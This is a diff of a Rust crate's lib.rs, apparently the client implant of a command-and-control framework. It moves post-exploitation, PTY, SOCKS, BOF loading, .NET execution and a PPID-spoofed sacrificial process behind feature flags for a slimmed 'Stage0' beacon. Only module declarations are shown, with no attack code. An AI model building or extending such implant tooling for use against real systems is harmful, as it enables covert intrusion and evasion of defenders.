@@ -7,8 +7,6 @@ extern crate log;
 extern crate winapi;
 
 /// Debug print macro — completely eliminated in release builds.
-/// In debug builds, outputs via log::debug!.
-/// In release builds, the entire expression (including format args) is dead code eliminated.
 #[macro_export]
 macro_rules! dbg_print {
     ($($arg:tt)*) => {
@@ -24,52 +22,91 @@ pub mod types;
 pub mod backoff;
 #[cfg(feature = "ws")]
 pub mod connection;
-pub mod executor;
 pub mod handler;
 pub mod config;
-pub mod fs;
 pub mod transport;
 pub mod crypto;
 
-pub mod pty;
-pub mod socks;
+// --- Post-ex (NOT in pure Stage0 / beacon) ---
+#[cfg(feature = "post-ex")]
+pub mod executor;
+#[cfg(feature = "post-ex")]
+pub mod fs;
+#[cfg(feature = "post-ex")]
 pub mod process;
+
+#[cfg(feature = "pty")]
+pub mod pty;
+#[cfg(feature = "socks")]
+pub mod socks;
+
 #[macro_use]
 pub mod utils;
-pub mod injection;
-#[cfg(target_os = "windows")]
+
+#[cfg(all(feature = "dotnet", target_os = "windows"))]
 pub mod dotnet;
+
+#[cfg(feature = "plugin")]
 pub mod plugin_router;
+
+#[cfg(feature = "plugin")]
 pub mod batch_handler;
+
 pub mod stealth;
+
+#[cfg(feature = "bof")]
 pub mod loader;
+
+// Syscall / native helpers (Windows). Stage0 still links a thin subset; heavy BOF
+// paths remain behind feature "bof". Further strip planned in Phase 5.
 pub mod syscalls;
-pub mod fallback; // 🛡️ Phase 3: Fallback Channel
+pub mod native;
+
+// Stage0 module package format + loader (L2 pipeline)
+pub mod module_package;
+#[cfg(feature = "module-loader")]
+pub mod module_loader;
+
+// PPID-spoofed sacrificial host for BOF/.NET
+#[cfg(feature = "isolated-exec")]
+pub mod isolated_exec;
+
+pub mod fallback;
 
 // 重新导出常用类型
 pub use error::{ClientError, Result};
 pub use types::{
-    CommandPayload, CommandResult, MessageType, MessageWrapper, 
+    CommandPayload, CommandResult, MessageType, MessageWrapper,
     RegisterPayload, ResponsePayload, SystemInfo,
 };
 pub use backoff::ExponentialBackoff;
 #[cfg(feature = "ws")]
 pub use connection::ConnectionManager;
+#[cfg(feature = "post-ex")]
 pub use executor::CommandExecutor;
 pub use handler::MessageHandler;
 pub use config::{
-    get_server_url, validate_server_url, get_config_info, ConfigInfo, 
+    get_server_url, validate_server_url, get_config_info, ConfigInfo,
     get_aes_key, get_crypto_config_info, CryptoConfigInfo,
-    get_heartbeat_interval, get_dns_resolver
+    get_heartbeat_interval, get_dns_resolver,
 };
+#[cfg(feature = "post-ex")]
 pub use fs::{ls, upload, download, FileInfo};
 pub use transport::{Transport, create_transport};
 pub use crypto::{encrypt, decrypt};
 
 pub use utils::get_agent_uuid;
-pub use injection::ProcessInjector;
-#[cfg(target_os = "windows")]
+
+#[cfg(all(feature = "dotnet", target_os = "windows"))]
 pub use dotnet::DotNetExecutor;
-pub use plugin_router::{PluginRouter, PluginTask, PluginMetadata, BatchExecutionManager, BatchConfig, BufferedResult};
+
+#[cfg(feature = "plugin")]
+pub use plugin_router::{
+    PluginRouter, PluginTask, PluginMetadata, BatchExecutionManager, BatchConfig, BufferedResult,
+};
+
+#[cfg(feature = "plugin")]
 pub use batch_handler::BatchMessageHandler;
-pub use loader::{get_loader, MemoryLoader, MigrationStatus};
+
+#[cfg(test)]
+mod feature_gates_test;
